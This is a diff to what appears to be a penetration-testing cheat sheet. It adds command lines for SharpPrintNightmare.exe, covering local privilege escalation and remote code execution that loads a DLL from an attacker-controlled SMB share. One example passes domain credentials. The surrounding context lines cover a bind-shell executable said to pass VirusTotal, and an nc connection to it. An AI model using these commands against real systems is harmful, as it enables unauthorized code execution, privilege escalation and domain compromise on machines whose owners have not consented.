@@ -75,3 +75,15 @@ bind-dxntboy-8282.exe has green status from virus total and can be run on update
 ```
 nc <target> 8282
 ```
+
+### SharpPrintNightmare.exe
+```
+ #LPE
+C:\SharpPrintNightmare.exe C:\addCube.dll
+
+#RCE using existing context
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
+
+#RCE using runas /netonly
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
+ ```
